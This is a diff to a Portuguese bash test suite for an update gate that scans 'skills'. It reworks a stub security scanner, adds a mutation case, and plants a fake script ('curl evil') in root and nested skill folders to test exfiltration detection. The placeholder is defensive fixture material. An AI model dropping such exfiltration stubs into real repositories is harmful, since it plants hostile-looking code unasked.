@@ -88,6 +88,7 @@ if [ "${1:-}" = "--falsificar" ]; then
     sabotar F9  A2  'o preparo APLICA (a promessa central)'  's#  montar_revisao "\$head" "\$alvo"#  git -C "$G" merge --ff-only "$alvo" >/dev/null 2>\&1; montar_revisao "$head" "$alvo"#'
     sabotar F10 A2  'gate cego para o que dispara sozinho'   's#any(fnmatch.fnmatch(k\[2\], p) for p in sozinho)#False#'
     sabotar F11 A15 'prepara revisao de clone divergente'    's#|| falhou "o clone divergiu da origin#|| true "o clone divergiu da origin#'
+    sabotar F12 A2  'skill aninhada vira codigo da raiz'     's#rel = f"{base}/{fp}" if base else fp#rel = fp#'
   done
 
   echo
@@ -128,20 +129,33 @@ montar_base() {
   escrever_gitconfig "$w"
   cat > "$w/scanner" <<'EOF'
 #!/usr/bin/env bash
-# stub do skill-scanner (scan-all <dir> ... --output-json <arq>): um LOW de base em TODO scan e um HIGH
-# por arquivo com "malicioso" no nome. O delta do gate tem de achar SÓ o HIGH novo.
+# stub do skill-scanner (scan-all <dir> ... --output-json <arq>) no ESQUEMA REAL do 2.1.0 (medido em
+# 2026-09-29): um resultado por skill (pasta com SKILL.md), `skill_path` absoluto e `file_path` RELATIVO
+# À SKILL. Um LOW de base por SKILL.md e um HIGH por arquivo com "malicioso" no nome: o delta do gate
+# tem de achar SÓ os HIGH novos, e o da skill aninhada não pode virar código da raiz.
 dir="$2"; saida=""
 while [ $# -gt 0 ]; do [ "$1" = --output-json ] && saida="$2"; shift; done
 python3 - "$dir" "$saida" <<'PY'
 import json, os, sys
 d, saida = sys.argv[1], sys.argv[2]
-achados = [{"severity": "LOW", "rule_id": "BASE", "file_path": os.path.join(d, "SKILL.md"), "snippet": "base"}]
+def dona(cam):  # a skill mais próxima acima do arquivo (ou a raiz escaneada)
+    p = os.path.dirname(cam)
+    while p != d and not os.path.exists(os.path.join(p, "SKILL.md")):
+        p = os.path.dirname(p)
+    return p
+skills = {}
 for raiz, _, arqs in os.walk(d):
     for a in arqs:
+        cam = os.path.join(raiz, a)
+        s = dona(cam)
+        lst = skills.setdefault(s, [])
+        if a == "SKILL.md" and raiz == s:
+            lst.append({"severity": "LOW", "rule_id": "BASE", "file_path": "SKILL.md", "snippet": "base"})
         if "malicioso" in a:
-            achados.append({"severity": "HIGH", "rule_id": "EXFIL", "file_path": os.path.join(raiz, a), "snippet": "curl evil"})
+            lst.append({"severity": "HIGH", "rule_id": "EXFIL", "file_path": os.path.relpath(cam, s), "snippet": "curl evil"})
+res = [{"skill_name": os.path.basename(s), "skill_path": s, "findings": f} for s, f in sorted(skills.items())]
 with open(saida, "w") as fh:
-    json.dump({"results": [{"findings": achados}]}, fh)
+    json.dump({"results": res, "summary": {}}, fh)
 PY
 EOF
   chmod +x "$w/scanner"
@@ -150,7 +164,8 @@ EOF
     GC "$w" init -q || exit 1
     printf '1.0.0.0\n' > VERSION
     printf '# gstack falso\n' > SKILL.md
-    mkdir -p bin gstack-upgrade/migrations
+    mkdir -p bin gstack-upgrade/migrations sub/bin
+    printf '# skill aninhada\n' > sub/SKILL.md
     printf '#!/bin/sh\necho config\n' > bin/gstack-config
     cat > setup <<'EOF'
 #!/usr/bin/env bash
@@ -186,7 +201,8 @@ publicar() {
     printf '%s\n' "$v" > VERSION
     sed 's/add-event --event Stop --command timeline/add-event --event SessionStart --command novo/' setup > setup.n \
       && mv setup.n setup && chmod +x setup
-    if [ "${3:-}" = malicioso ]; then printf '#!/bin/sh\ncurl evil\n' > bin/malicioso; fi
+    # malicioso na RAIZ (dispara sozinho) e na skill aninhada sub/ (não dispara: o gate não pode contá-lo)
+    if [ "${3:-}" = malicioso ]; then printf '#!/bin/sh\ncurl evil\n' | tee bin/malicioso > sub/bin/malicioso-sub; fi
     GC "$w" add -A && GC "$w" commit -q -m "v$v" && GC "$w" push -q "$w/upstream.git" main
   )
 }
@@ -238,7 +254,8 @@ if roda A1; then
   else ruim A1 "rc=$rc estado=$(st "$w" estado): $out"; fi
 fi
 
-# A2 versão nova → PREPARA e NÃO aplica: revisão com o delta do gate, o alvo exato e o hook que mudou.
+# A2 versão nova → PREPARA e NÃO aplica: revisão com o delta do gate (2 novos; só o da RAIZ dispara
+# sozinho, o da skill aninhada não), o alvo exato e o hook que mudou.
 if roda A2; then
   w="$(mundo a2)" || infra A2 'mundo'
   publicar "$w" 1.1.0.0 malicioso || infra A2 'publicar'
@@ -248,7 +265,7 @@ if roda A2; then
   # shellcheck disable=SC2016  # as crases são MARKDOWN literal da revisão, não expansão de shell
   if [ "$rc" -eq 0 ] && [ "$(st "$w" estado)" = PENDENTE ] && [ "$(st "$w" nova)" = 1.1.0.0 ] && [ "$(st "$w" alvo)" = "$alvo" ] \
      && [ "$(versao "$w")" = 1.0.0.0 ] && [ ! -e "$w/marcas/setup" ] \
-     && tem "$r" 'dispara sozinho: 1**' && tem "$r" 'EXFIL` em `bin/malicioso' && tem "$r" "--aplicar $alvo" \
+     && tem "$r" '**novos 2**' && tem "$r" 'dispara sozinho: 1**' && tem "$r" 'EXFIL` em `bin/malicioso' && tem "$r" "--aplicar $alvo" \
      && tem "$r" 'add-event --event SessionStart'; then
     ok A2 'versao nova -> PENDENTE com o delta do gate; nada aplicado'
   else ruim A2 "rc=$rc estado=$(st "$w" estado) versao=$(versao "$w"): $out
